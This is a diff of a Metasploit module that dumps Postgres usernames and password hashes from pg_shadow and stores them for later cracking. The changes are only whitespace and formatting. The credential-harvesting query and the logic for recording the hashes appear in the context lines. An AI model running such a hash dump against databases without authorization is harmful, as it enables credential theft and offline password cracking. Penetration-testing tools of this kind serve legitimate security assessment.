@@ -11,16 +11,15 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'Postgres Password Hashdump',
-      'Description'    => %Q{
+      'Name' => 'Postgres Password Hashdump',
+      'Description' => %Q{
           This module extracts the usernames and encrypted password
         hashes from a Postgres server and stores them for later cracking.
       },
-      'Author'         => ['theLightCosine'],
-      'License'        => MSF_LICENSE
+      'Author' => ['theLightCosine'],
+      'License' => MSF_LICENSE
     )
     deregister_options('SQL', 'RETURN_ROWSET', 'VERBOSE')
-
   end
 
   def username
@@ -39,24 +38,24 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     self.postgres_conn = session.client if session
     # Query the Postgres Shadow table for username and password hashes and report them
-    res = postgres_query('SELECT usename, passwd FROM pg_shadow',false)
+    res = postgres_query('SELECT usename, passwd FROM pg_shadow', false)
 
     service_data = {
-        address: postgres_conn.peerhost,
-        port: postgres_conn.peerport,
-        service_name: 'postgres',
-        protocol: 'tcp',
-        workspace_id: myworkspace_id
+      address: postgres_conn.peerhost,
+      port: postgres_conn.peerport,
+      service_name: 'postgres',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
     }
 
     credential_data = {
-        module_fullname: self.fullname,
-        origin_type: :service,
-        private_data: password,
-        private_type: :password,
-        username: username,
-        realm_key:  Metasploit::Model::Realm::Key::POSTGRESQL_DATABASE,
-        realm_value: database
+      module_fullname: self.fullname,
+      origin_type: :service,
+      private_data: password,
+      private_type: :password,
+      username: username,
+      realm_key: Metasploit::Model::Realm::Key::POSTGRESQL_DATABASE,
+      realm_value: database
     }
 
     credential_data.merge!(service_data)
@@ -70,9 +69,9 @@ class MetasploitModule < Msf::Auxiliary
       # We know the credentials worked but something else went wrong
       credential_core = create_credential(credential_data)
       login_data = {
-          core: credential_core,
-          last_attempted_at: DateTime.now,
-          status: Metasploit::Model::Login::Status::SUCCESSFUL
+        core: credential_core,
+        last_attempted_at: DateTime.now,
+        status: Metasploit::Model::Login::Status::SUCCESSFUL
       }
       login_data.merge!(service_data)
       create_credential_login(login_data)
@@ -88,9 +87,9 @@ class MetasploitModule < Msf::Auxiliary
     when :complete
       credential_core = create_credential(credential_data)
       login_data = {
-          core: credential_core,
-          last_attempted_at: DateTime.now,
-          status: Metasploit::Model::Login::Status::SUCCESSFUL
+        core: credential_core,
+        last_attempted_at: DateTime.now,
+        status: Metasploit::Model::Login::Status::SUCCESSFUL
       }
       login_data.merge!(service_data)
       # We know the credentials worked and have admin access because we got the hashes
@@ -99,19 +98,18 @@ class MetasploitModule < Msf::Auxiliary
       print_good("Query appears to have run successfully")
     end
 
-
     tbl = Rex::Text::Table.new(
-      'Header'  => 'Postgres Server Hashes',
-      'Indent'   => 1,
+      'Header' => 'Postgres Server Hashes',
+      'Indent' => 1,
       'Columns' => ['Username', 'Hash']
     )
 
     service_data = {
-        address: postgres_conn.peerhost,
-        port: postgres_conn.peerport,
-        service_name: 'postgres',
-        protocol: 'tcp',
-        workspace_id: myworkspace_id
+      address: postgres_conn.peerhost,
+      port: postgres_conn.peerport,
+      service_name: 'postgres',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
     }
 
     res[:complete].rows.each do |row|
@@ -138,8 +136,8 @@ class MetasploitModule < Msf::Auxiliary
 
       credential_core = create_credential(credential_data)
       login_data = {
-          core: credential_core,
-          status: Metasploit::Model::Login::Status::UNTRIED
+        core: credential_core,
+        status: Metasploit::Model::Login::Status::UNTRIED
       }
       login_data.merge!(service_data)
       create_credential_login(login_data)
